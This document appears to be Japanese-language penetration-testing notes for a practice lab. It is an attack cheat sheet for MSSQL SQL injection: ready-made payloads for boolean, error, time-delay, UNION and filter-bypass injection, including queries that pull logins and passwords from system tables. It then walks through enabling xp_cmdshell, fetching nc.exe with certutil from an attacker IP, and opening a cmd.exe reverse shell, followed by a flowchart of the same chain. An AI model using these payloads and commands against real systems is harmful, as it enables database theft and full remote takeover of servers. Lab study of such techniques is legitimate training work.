# 判断基準

エラーメッセージや構文挙動で MSSQL を特定
→ 例：Unclosed quotation mark、Microsoft OLE DB Provider

管理者権限の可能性がある場合
→ xp_cmdshell を有効化できる

攻撃対象が Windows サーバである場合
→ certutil や Netcat を使って容易にリバースシェルが作れる

```bash
# 🔸【基本チェック（ロジックベース）】
' OR 1=1-- 
' OR '1'='1'-- 
') OR ('a'='a'-- 
1 OR 1=1--  

---

# 🔸【エラーを誘発させるペイロード（エラーベース）】
' ORDER BY 100-- 
' AND CONVERT(INT, 'test') = 1-- 
' AND 1 = (SELECT 1/0)-- 
' AND 1 = (SELECT COUNT(*) FROM master.dbo.sysobjects)--  

---

# 🔸【時間遅延型ブラインドSQLi】
' WAITFOR DELAY '0:0:5'-- 
' IF (1=1) WAITFOR DELAY '0:0:5'-- 
1'; WAITFOR DELAY '0:0:5'-- 
' ; WAITFOR DELAY '00:00:05'--  

---

# 🔸【UNIONベースのテスト】

' UNION SELECT NULL-- 
' UNION SELECT NULL,NULL-- 
' UNION SELECT 1,@@version-- 
' UNION SELECT name, password FROM master..syslogins-- 

---

# 🔸【Booleanベース ブラインドSQLi】

' AND 1=1-- 
' AND 1=2-- 
' AND ASCII(SUBSTRING((SELECT SYSTEM_USER),1,1))=83-- 
' AND EXISTS(SELECT * FROM master.dbo.sysdatabases)-- 

---

# 🔸【WAF・フィルタ回避用】
'/**/OR/**/1=1-- 
' OR+1=1-- 
' OR 1=1/*comment*/-- 
' OR 1=1--+` 

---

# 🔸【MSSQL特有のシステム情報列挙】
' AND EXISTS(SELECT * FROM master..sysdatabases)-- 
' UNION SELECT name, dbid FROM master..sysdatabases-- 
' UNION SELECT name, loginname FROM master..syslogins-- 
' AND SYSTEM_USER='sa'--  

---
```

## ✅ MSSQL特有のポイント

- 時間遅延には `WAITFOR DELAY 'hh:mm:ss'` を使う。
    
- `master..syslogins` や `sysdatabases` などのシステムテーブルから情報取得を試みる。
    
- `@@version`, `SYSTEM_USER`, `USER_NAME()` は環境情報を引き出すのに有効。
# 入力フォームがあった場合の一例

## 攻撃の流れ

### 高度なオプションを有効化
```
1';EXEC sp_configure 'show advanced options',1;--
1';RECONFIGURE;--
```
- sp_configure 'show advanced options',1 → 高度なオプションを表示できるように設定
- RECONFIGURE → 設定を反映
- 目的：xp_cmdshell を有効化する準備

### xp_cmdshell を有効化
```
1';EXEC sp_configure 'xp_cmdshell',1;--
1';RECONFIGURE;
```
- xp_cmdshell は MSSQL から OSコマンドを実行できる拡張ストアドプロシージャ
これを有効にすることで、SQLから直接Windowsコマンドが実行可能になる

### nc.exe をサーバにダウンロード
```
1';EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.45.201/nc.exe C:\windows\temp\nc.exe';--
```
- certutil を使ってリモートサーバから Netcat バイナリをダウンロード
- 保存先は C:\windows\temp\nc.exe

### リバースシェルを作成
```
1';EXEC xp_cmdshell 'C:\windows\temp\nc.exe 192.168.45.201 9999 -e cmd.exe';--
```
- Netcat を使って攻撃者マシンに接続
- -e cmd.exe で Windowsコマンドプロンプトをリモートに渡す
- 攻撃者はリスナー（例：nc -lvnp 9999）で受信

```sql
┌───────────────────────────────┐
│ 1. SQLインジェクションで MSSQL │
│    が対象であることを確認      │
│  (エラーメッセージや Time-based) │
└───────────────┬───────────────┘
                │
                ▼
┌───────────────────────────────┐
│ 2. 高度なオプションを有効化   │
│  SQL:                           │
│  EXEC sp_configure 'show        │
│  advanced options',1;           │
│  RECONFIGURE;                   │
└───────────────┬───────────────┘
                │
                ▼
┌───────────────────────────────┐
│ 3. xp_cmdshell を有効化        │
│  SQL:                           │
│  EXEC sp_configure 'xp_cmdshell',1; │
│  RECONFIGURE;                   │
└───────────────┬───────────────┘
                │
                ▼
┌───────────────────────────────┐
│ 4. 攻撃者サーバから nc.exe を │
│    MSSQLサーバにダウンロード   │
│  SQL:                           │
│  EXEC xp_cmdshell 'certutil     │
│  -urlcache -f http://<攻撃者IP>/nc.exe │
│  C:\windows\temp\nc.exe';      │
└───────────────┬───────────────┘
                │
                ▼
┌───────────────────────────────┐
│ 5. リバースシェルを接続       │
│  SQL:                           │
│  EXEC xp_cmdshell 'C:\windows\temp\nc.exe │
│  <攻撃者IP> 9999 -e cmd.exe';  │
│  攻撃者側 nc -lvnp 9999 で待機 │
└───────────────┬───────────────┘
                │
                ▼
┌───────────────────────────────┐
│ 6. Windowsコマンドプロンプト  │
│    をリモートで取得            │
│  → 権限昇格 / 横展開の準備     │
└───────────────────────────────┘

```
## ポイントまとめ
- DB種類判定 → xp_cmdshell 有効化 → バイナリ転送 → リバースシェル
- certutil は OS標準のツール を使うのでファイルレスに近い
- Netcat リバースシェル で踏み台を完全制御可能
- 演習環境では 権限昇格や横展開までつなげる練習 に最適